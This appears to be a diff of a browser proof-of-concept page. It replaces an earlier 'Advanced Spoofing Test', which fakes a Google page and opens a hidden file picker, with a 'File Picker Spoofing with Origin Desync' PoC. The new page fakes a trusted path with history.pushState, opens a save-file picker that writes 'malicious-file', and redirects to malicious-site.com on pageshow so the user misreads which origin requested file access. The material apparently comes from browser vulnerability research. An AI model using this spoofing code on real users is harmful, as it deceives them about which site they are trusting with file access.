@@ -1,60 +1,115 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Spoofing Test</title>
-    <script>
-        // Fungsi untuk memicu file picker
-        function openFilePicker() {
-            const fileInput = document.createElement('input');
-            fileInput.type = 'file';
-            fileInput.accept = 'image/*';  // Menerima hanya file gambar
-            fileInput.style.display = 'none';  // Menyembunyikan file input dari pengguna
+<meta charset="utf-8">
+<title>File Picker Spoofing with Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
-            // Menangani perubahan file yang dipilih
-            fileInput.addEventListener('change', (event) => {
-                const file = event.target.files[0];
-                if (file) {
-                    console.log('File selected:', file.name);
-                    // Simulasi pengunduhan atau pemrosesan file
-                }
-            });
+<style>
+body {
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
+}
 
-            // Menambahkan elemen file input dan memicu klik
-            document.body.appendChild(fileInput);
-            fileInput.click();  // Memunculkan dialog file picker
-        }
+button {
+  margin:40px;
+  font-size:18px;
+  padding:10px 18px;
+}
 
-        // Fungsi untuk mengubah konten halaman
-        function changePageContent() {
-            document.body.innerHTML = "<h1>Welcome to Google!</h1><p>If you just selected a file, it was from the Google website.</p>";
-        }
+#panel {
+  display:none;
+  max-width:420px;
+  margin:80px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+}
 
-        // Fungsi untuk menavigasi ke URL lain dan mengubah konten
-        function spoofNavigation() {
-            openFilePicker();  // Memicu file picker
-            setTimeout(() => {
-                // Mengubah konten halaman untuk menampilkan seolah-olah sudah di Google
-                changePageContent();
+h2 { text-align:center; margin-bottom:6px; }
+.sub { text-align:center; color:#666; margin-bottom:20px; }
 
-                // Navigasi ke URL lain (misalnya, Google)
-                window.location.href = 'https://www.google.com:8080';  // Mengarahkan ke situs lain
-            }, 500);  // Menunggu setengah detik sebelum memulai perubahan
-        }
+.notice {
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
+}
 
-        // Memulai interaksi dengan halaman
-        function enhancedSpoofing() {
-            document.body.innerHTML = "<h1>Click anywhere to trigger the malicious flow.</h1>";  // Reset halaman agar lebih menarik
-            document.addEventListener('click', () => {
-                spoofNavigation();  // Memulai spoofing navigasi dan file picker
-            });
-        }
-
-        window.onload = enhancedSpoofing;  // Mulai spoofing setelah halaman dimuat
-    </script>
+.save-file-button {
+  margin-top:20px;
+  width:100%;
+  padding:12px;
+  font-size:16px;
+  border-radius:10px;
+  border:none;
+  background:#007aff;
+  color:#fff;
+}
+</style>
 </head>
+
 <body>
-    <h1>Loading...</h1>  <!-- Tampilan sementara yang akan diganti -->
+
+<div style="text-align:center">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Download File</h2>
+  <div class="sub">Click below to trigger file picker</div>
+
+  <button class="save-file-button" onclick="triggerSaveFilePicker()">Save File</button>
+
+  <div class="notice">
+    Demo only — file picker is simulated, no data is saved.
+  </div>
+</div>
+
+<script>
+const panel = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+
+async function triggerSaveFilePicker() {
+  if ('showSaveFilePicker' in window) {
+    try {
+      const handle = await window.showSaveFilePicker({
+        suggestedName: 'malicious-file',
+        types: [{
+          description: 'Test Files',
+          accept: {'text/plain': ['.txt']},
+        }],
+      });
+
+      const writable = await handle.createWritable();
+      await writable.write('This is a malicious file!');
+      await writable.close();
+    } catch (err) {
+      console.error('Error opening file picker:', err);
+    }
+  } else {
+    alert('This browser does not support the file picker API.');
+  }
+}
+
+trigger.onclick = () => {
+  // Mimic the trusted origin behavior
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+// Trigger navigation AFTER tab restore (mimics desync)
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'http://malicious-site.com'; // Malicious URL to simulate context change
+      }, 80);
+    });
+  });
+});
+</script>
+
 </body>
 </html>
